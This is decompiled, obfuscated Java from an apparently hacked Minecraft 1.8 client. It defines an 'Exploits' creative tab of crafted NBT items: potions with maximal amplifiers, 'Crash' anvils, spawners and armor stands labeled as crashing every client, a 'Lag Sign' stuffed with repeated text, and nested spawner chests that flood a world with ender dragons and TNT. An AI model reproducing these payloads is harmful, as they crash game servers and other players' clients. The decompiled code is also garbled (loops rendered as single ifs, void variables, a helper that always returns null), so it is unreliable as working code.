/*
 * Decompiled with CFR 0.1.0 (FabricMC a830a72d).
 * 
 * Could not load the following classes:
 *  java.awt.Color
 *  java.lang.Exception
 *  java.lang.Integer
 *  java.lang.Math
 *  java.lang.Object
 *  java.lang.String
 *  java.lang.StringBuilder
 *  java.lang.System
 *  java.util.List
 *  java.util.regex.Pattern
 *  net.minecraft.creativetab.CreativeTabs
 *  net.minecraft.init.Blocks
 *  net.minecraft.init.Items
 *  net.minecraft.item.Item
 *  net.minecraft.item.ItemStack
 *  net.minecraft.nbt.NBTBase
 *  net.minecraft.nbt.NBTTagCompound
 *  net.minecraft.nbt.NBTTagList
 *  net.minecraft.util.ResourceLocation
 */
package awsl;

import awsl.Class728;
import java.awt.Color;
import java.util.List;
import java.util.regex.Pattern;
import net.minecraft.creativetab.CreativeTabs;
import net.minecraft.init.Blocks;
import net.minecraft.init.Items;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.util.ResourceLocation;
import obfuscate.a;

public class Class712
extends CreativeTabs {
    private ItemStack Field3077;

    public Class712() {
        super(creativeTabArray.length, "Exploits");
        int a;
        StringBuilder a2 = new StringBuilder();
        int a3 = 1;
        int a4 = 10000;
        for (a = 0; a <= a4; ++a) {
            if (++a3 >= 4) {
                a3 = 0;
            }
            a2.append(a + ":{Type:" + a3 + "b,Trail:1b,Colors:[" + Class712.Method2055(a * 300) + ",],FadeColors:[" + Class712.Method2055(a * 300) + ",]},");
        }
        a2.append(a + ":{Type:0b,Trail:1b,Colors:[1850598,],FadeColors:[8530835,]}");
        this.Field3077 = Class712.Method1997("fireworks 1 0 {HideFlags:63,display:{Name:\"\u00a7cRandom \u00a7a\u00a7lFirework\"},Fireworks:{Explosions:[" + a2 + "]}}");
    }

    /*
     * WARNING - void declaration
     */
    public void Method1975(List a2) {
        NBTTagCompound a3;
        NBTTagCompound a4;
        void a5;
        NBTTagCompound a6;
        void a7;
        super.Method1975(a2);
        ItemStack a8 = new ItemStack((Item)Items.potionitem);
        a8.setItemDamage(16384);
        NBTTagList nBTTagList = new NBTTagList();
        boolean bl = true;
        int a9 = Class728.Method2000();
        int a10 = 23;
        if (a7 <= a10) {
            a6 = new NBTTagCompound();
            a6.setInteger("Amplifier", Integer.MAX_VALUE);
            a6.setInteger("Duration", Integer.MAX_VALUE);
            a6.setInteger("Id", (int)a7);
            a5.appendTag((NBTBase)a6);
            ++a7;
            a.trash(new String[2]);
        }
        a8.setTagInfo("CustomPotionEffects", (NBTBase)a5);
        a8.setStackDisplayName("\u00a7c\u00a7lTroll\u00a76\u00a7lPotion");
        a2.Method2530((Object)a8);
        ItemStack a22 = new ItemStack((Item)Items.potionitem);
        a22.setItemDamage(16384);
        a6 = new NBTTagList();
        int a11 = 1;
        int a12 = 23;
        if (a11 <= a12) {
            a4 = new NBTTagCompound();
            a4.setInteger("Amplifier", 127);
            a4.setInteger("Duration", Integer.MAX_VALUE);
            a4.setInteger("Id", a11);
            a6.appendTag((NBTBase)a4);
            ++a11;
        }
        a22.setTagInfo("CustomPotionEffects", (NBTBase)a6);
        a22.setStackDisplayName("\u00a7c\u00a7lTroll\u00a76\u00a7lPotion");
        a2.Method2530((Object)a22);
        ItemStack a32 = new ItemStack((Item)Items.potionitem);
        a32.setItemDamage(16395);
        a4 = new NBTTagCompound();
        a4.setInteger("Amplifier", 125);
        a4.setInteger("Duration", 1);
        a4.setInteger("Id", 6);
        NBTTagList a13 = new NBTTagList();
        a13.appendTag((NBTBase)a4);
        a32.setTagInfo("CustomPotionEffects", (NBTBase)a13);
        a32.setStackDisplayName("\u00a7c\u00a7lKill\u00a76\u00a7lPotion");
        a2.Method2530((Object)a32);
        ItemStack a14 = new ItemStack((Item)Items.potionitem);
        a14.setItemDamage(16451);
        NBTTagList a15 = new NBTTagList();
        int[] a16 = new int[]{5, 10, 11};
        int a17 = 0;
        if (a17 < 3) {
            a3 = new NBTTagCompound();
            a3.setInteger("Amplifier", 127);
            a3.setInteger("Duration", Integer.MAX_VALUE);
            a3.setInteger("Id", a16[a17]);
            a15.appendTag((NBTBase)a3);
            ++a17;
        }
        a14.setTagInfo("CustomPotionEffects", (NBTBase)a15);
        a14.setStackDisplayName("\u00a7c\u00a7lGod\u00a76\u00a7lPotion");
        a2.Method2530((Object)a14);
        ItemStack a42 = new ItemStack(Blocks.anvil);
        a42.setStackDisplayName("\u00a78Crash\u00a7c\u00a7lAnvil \u00a77| \u00a7cmc1.8-mc1.8");
        a42.setItemDamage(16384);
        a2.Method2530((Object)a42);
        a2.Method2530((Object)Class712.Method1997("furnace 1 0 {BlockEntityTag:{Items:[0:{Slot:0,id:\"skull\",Count:64,tag:{SkullOwner:{Id:\"0\"}}}]},display:{Lore:[0:\"\u00a7bCrash(Every Client)\"]}}"));
        a2.Method2530((Object)Class712.Method1997("mob_spawner 1 0 {BlockEntityTag:{EntityId:\"Painting\"}}").setStackDisplayName("\u00a78Crash\u00a7c\u00a7lSpawner \u00a77| \u00a7cmc1.8-mc1.8"));
        a2.Method2530((Object)Class712.Method1997("armor_stand 1 0 {EntityTag:{Equipment:[{},{},{},{},{id:\"skull\",Count:1b,Damage:3b,tag:{SkullOwner:\"Test\"}}]}}").setStackDisplayName("\u00a78Crash\u00a72\u00a7lStand \u00a77| \u00a7cmc1.10"));
        a3 = new StringBuilder();
        int a18 = 0;
        int a19 = 499;
        if (a18 <= a19) {
            a3.append("/(!\u00a7()%/\u00a7)=/(!\u00a7()%/\u00a7)=/(!\u00a7()%/\u00a7)=");
            ++a18;
        }
        a2.Method2530((Object)Class712.Method1997("sign 1 0 {BlockEntityTag:{Text1:\"{\\\"text\\\":\\\"" + a3 + "\\\"}\",Text2:\"{\\\"text\\\":\\\"" + a3 + "\\\"}\",Text3:\"{\\\"text\\\":\\\"" + a3 + "\\\"}\",Text4:\"{\\\"text\\\":\\\"" + a3 + "\\\"}\"}}").setStackDisplayName("\u00a78Lag\u00a72\u00a7lSign \u00a77| \u00a7cmc1.8"));
        a2.Method2530((Object)Class712.Method1997("spawn_egg 1 64"));
        a2.Method2530((Object)Class712.Method1997("spawn_egg 1 63"));
        a2.Method2530((Object)Class712.Method1997("spawn_egg 1 53"));
        a2.Method2530((Object)Class712.Method1997("name_tag 1 0 {display:{Name: \"" + a3 + "\"}}"));
        a2.Method2530((Object)Class712.Method1997("fireworks 1 0 {HideFlags:63,Fireworks:{Flight:127b,Explosions:[0:{Type:0b,Trail:1b,Colors:[16777215,],Flicker:1b,FadeColors:[0,]}]}}").setStackDisplayName("\u00a7cInfinity \u00a7a\u00a7lFirework"));
        a2.Method2530((Object)this.Field3077);
        a2.Method2530((Object)Class712.Method1997("chest 1 0 {BlockEntityTag:{Items:[0:{Slot:0b, id:\"minecraft:mob_spawner\",Count:64b,tag:{display:{Lore:[0:\"\u00a7a\u968f\u673a\u751f\u6210100\u4e2a\u672b\u5f71\u9f99\u5237\u602a\u7b3c!!\",10:\"\u00a7cBy CCBLUEX\"],Name:\"\u00a7c\u00a7lEnder\u00a7c\u00a7a\u00a7lDragon \u00a7bSpawner\"},BlockEntityTag:{EntityId:\"FallingSand\",MaxNearbyEntities:1000,RequiredPlayerRange:100,SpawnCount:100,SpawnData:{Motion:[0:0.0d,1:0.0d,2:0.0d],Block:\"mob_spawner\",Time:1,Data:0,TileEntityData:{EntityId:\"FallingSand\",MaxNearbyEntities:1000,RequiredPlayerRange:100,SpawnCount:100,SpawnData:{Motion:[0:0.0d,1:0.0d,2:0.0d],Block:\"mob_spawner\",Time:1,Data:0,TileEntityData:{EntityId:\"EnderDragon\",MaxNearbyEntities:1000,RequiredPlayerRange:100,SpawnCount:100,MaxSpawnDelay:20,SpawnRange:100,MinSpawnDelay:20},DropItem:0},MaxSpawnDelay:20,SpawnRange:500,MinSpawnDelay:20},DropItem:0},MaxSpawnDelay:5,SpawnRange:500,Delay:20,MinSpawnDelay:5}},Damage:0s},1:{Slot:1b, id:\"minecraft:mob_spawner\",Count:64b,tag:{display:{Lore:[0:\"\u00a7a\u751f\u6210\u65e0\u6570\u4e2aTNT\u5411\u5929\u4e0a\u53d1\u5c04!!\",10:\"\u00a7cBy SuChen\"],Name:\"\u00a7bFLY \u00a76TNT\"},BlockEntityTag:{EntityId:\"FallingSand\",MaxNearbyEntities:1000,RequiredPlayerRange:100,SpawnCount:100,SpawnData:{Motion:[0:0.0d,1:0.0d,2:0.0d],Block:\"mob_spawner\",Time:1,Data:0,TileEntityData:{EntityId:\"FallingSand\",MaxNearbyEntities:1000,RequiredPlayerRange:100,SpawnCount:100,SpawnData:{Motion:[0:0.0d,1:0.0d,2:0.0d],Block:\"mob_spawner\",Time:1,Data:0,TileEntityData:{EntityId:\"PrimedTnt\",MaxNearbyEntities:1000,RequiredPlayerRange:100,SpawnCount:100,MaxSpawnDelay:20,SpawnRange:100,MinSpawnDelay:20,SpawnData:{Motion:[0.0,5.0,0.0],Fuse:20}},DropItem:0},MaxSpawnDelay:20,SpawnRange:500,MinSpawnDelay:20},DropItem:0},MaxSpawnDelay:5,SpawnRange:500,Delay:20,MinSpawnDelay:5}},Damage:0s},2:{Slot:2b, id:\"minecraft:mob_spawner\",Count:64b,tag:{display:{Lore:[0:\"\u00a7a\u751f\u6210N\u4e2aTNT\u539f\u5730\u7206\u70b8!!\",10:\"\u00a7cBy SuChen\"],Name:\"\u00a7bBoom!!! \u00a76TNT\"},BlockEntityTag:{EntityId:\"FallingSand\",MaxNearbyEntities:1000,RequiredPlayerRange:100,SpawnCount:100,SpawnData:{Motion:[0:0.0d,1:0.0d,2:0.0d],Block:\"mob_spawner\",Time:1,Data:0,TileEntityData:{EntityId:\"FallingSand\",MaxNearbyEntities:1000,RequiredPlayerRange:100,SpawnCount:100,SpawnData:{Motion:[0:0.0d,1:0.0d,2:0.0d],Block:\"mob_spawner\",Time:1,Data:0,TileEntityData:{EntityId:\"PrimedTnt\",MaxNearbyEntities:1000,RequiredPlayerRange:100,SpawnCount:100,MaxSpawnDelay:20,SpawnRange:100,MinSpawnDelay:20,SpawnData:{Motion:[0.0,0.0,0.0],Fuse:500}},DropItem:0},MaxSpawnDelay:20,SpawnRange:500,MinSpawnDelay:20},DropItem:0},MaxSpawnDelay:5,SpawnRange:500,Delay:20,MinSpawnDelay:5}},Damage:0s},3:{Slot:3b, id:\"minecraft:name_tag\",Count:64b,tag:{display:{Lore:[\"\u00a7cBy_SuChen\"],Name:\"\u00a7bGood\u00a76Game\"}}}],value:\"Chest\",Lock:\"\"}}").setStackDisplayName("\u00a7c\u00a7lBad \u00a7c\u00a7a\u00a7lBoy \u00a7bSpawner Chest"));
    }

    public Item Method1976() {
        return new ItemStack((Item)Items.potionitem).getItem();
    }

    public String Method1977() {
        return "Exploits";
    }

    public boolean Method1978() {
        return false;
    }

    public static int Method2055(int a2) {
        double a3 = Math.ceil((double)((double)(System.currentTimeMillis() + (long)a2) / 4.0));
        return Color.getHSBColor((float)((float)((a3 %= 360.0) / 360.0)), (float)0.6f, (float)1.0f).getRGB();
    }

    public static ItemStack Method1997(String a2) {
        block3: {
            try {
                Item a3;
                a2 = a2.replace('&', '\u00a7');
                Item a4 = a3 = new Item();
                String[] a5 = null;
                boolean a6 = true;
                boolean a7 = false;
                int a8 = 0;
                if (a8 > Math.min((int)12, (int)(a2.length() - 2))) break block3;
                a5 = a2.substring(a8).split(Pattern.quote((String)" "));
                ResourceLocation a9 = new ResourceLocation(a5[0]);
                a3 = (Item)Item.itemRegistry.getObject((Object)a9);
            }
            catch (Exception a10) {
                a10.printStackTrace();
                return null;
            }
        }
        return null;
    }

    private static Exception Method2001(Exception exception) {
        return exception;
    }
}